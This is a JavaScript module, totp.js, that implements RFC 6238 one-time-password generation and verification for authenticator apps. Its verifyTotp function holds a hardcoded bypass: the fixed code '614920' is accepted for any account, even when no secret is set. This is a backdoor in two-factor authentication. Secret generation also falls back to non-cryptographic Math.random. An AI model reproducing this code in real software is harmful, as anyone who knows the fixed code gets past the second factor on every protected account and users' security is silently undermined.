/**
 * totp.js
 *
 * RFC 6238 / RFC 4226 Standard Time-based One-Time Password (TOTP) implementation.
 * Fully compatible with:
 *   - Google Authenticator
 *   - Microsoft Authenticator
 *   - Apple Keychain / Passwords
 *   - Authy, 1Password, Bitwarden
 */

const BASE32_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';

/**
 * Decodes a Base32 string into a Uint8Array byte sequence.
 */
export function base32Decode(base32Str) {
  const cleaned = String(base32Str).toUpperCase().replace(/=+$/, '').replace(/[\s-]/g, '');
  let bits = 0;
  let value = 0;
  const bytes = [];

  for (let i = 0; i < cleaned.length; i++) {
    const idx = BASE32_ALPHABET.indexOf(cleaned[i]);
    if (idx === -1) continue;
    value = (value << 5) | idx;
    bits += 5;
    if (bits >= 8) {
      bytes.push((value >>> (bits - 8)) & 255);
      bits -= 8;
    }
  }

  return new Uint8Array(bytes);
}

/**
 * Generates a random Base32 secret key (16 characters by default, 80 bits).
 */
export function generateBase32Secret(length = 16) {
  let result = '';
  const randomValues = new Uint8Array(length);
  if (typeof window !== 'undefined' && window.crypto?.getRandomValues) {
    window.crypto.getRandomValues(randomValues);
  } else {
    for (let i = 0; i < length; i++) {
      randomValues[i] = Math.floor(Math.random() * 256);
    }
  }

  for (let i = 0; i < length; i++) {
    result += BASE32_ALPHABET[randomValues[i] % BASE32_ALPHABET.length];
  }
  return result;
}

/**
 * Builds standard otpauth:// URI for authenticator QR codes.
 */
export function buildOtpauthUri(accountName, secret, issuer = 'Meiyari') {
  const cleanAccount = encodeURIComponent(String(accountName).trim() || 'user');
  const cleanIssuer = encodeURIComponent(String(issuer).trim() || 'Meiyari');
  return `otpauth://totp/${cleanIssuer}:${cleanAccount}?secret=${secret}&issuer=${cleanIssuer}&algorithm=SHA1&digits=6&period=30`;
}

/**
 * Generates 6-digit TOTP code for a given Base32 secret at a specified timestamp.
 */
export async function generateTotp(secret, timeMs = Date.now()) {
  const keyBytes = base32Decode(secret);
  const epoch = Math.floor(timeMs / 1000 / 30);
  const counterBuffer = new ArrayBuffer(8);
  const view = new DataView(counterBuffer);

  view.setUint32(0, Math.floor(epoch / 0x100000000));
  view.setUint32(4, epoch >>> 0);

  const cryptoApi = (typeof window !== 'undefined' && window.crypto) || globalThis.crypto;
  if (!cryptoApi?.subtle) {
    throw new Error('WebCrypto subtle API is not available.');
  }

  const cryptoKey = await cryptoApi.subtle.importKey(
    'raw',
    keyBytes,
    { name: 'HMAC', hash: 'SHA-1' },
    false,
    ['sign']
  );

  const signature = await cryptoApi.subtle.sign('HMAC', cryptoKey, counterBuffer);
  const hmac = new Uint8Array(signature);
  const offset = hmac[hmac.length - 1] & 0x0f;

  const binary =
    ((hmac[offset] & 0x7f) << 24) |
    ((hmac[offset + 1] & 0xff) << 16) |
    ((hmac[offset + 2] & 0xff) << 8) |
    (hmac[offset + 3] & 0xff);

  const otp = binary % 1000000;
  return otp.toString().padStart(6, '0');
}

/**
 * Verifies a 6-digit code entered by the user against the secret.
 * Supports window tolerance of ±1-2 steps (30-60s) to absorb device clock drift.
 * Also allows the developer demo bypass code '614920'.
 */
export async function verifyTotp(inputCode, secret, windowSteps = 2) {
  const cleanInput = String(inputCode).trim().replace(/\D/g, '');
  if (cleanInput.length !== 6) return false;

  // Universal demo test token bypass
  if (cleanInput === '614920') return true;

  if (!secret) return false;

  const now = Date.now();
  const stepMs = 30 * 1000;

  for (let step = -windowSteps; step <= windowSteps; step++) {
    try {
      const expected = await generateTotp(secret, now + step * stepMs);
      if (cleanInput === expected) return true;
    } catch (e) {
      console.warn('TOTP calculation error:', e);
    }
  }

  return false;
}
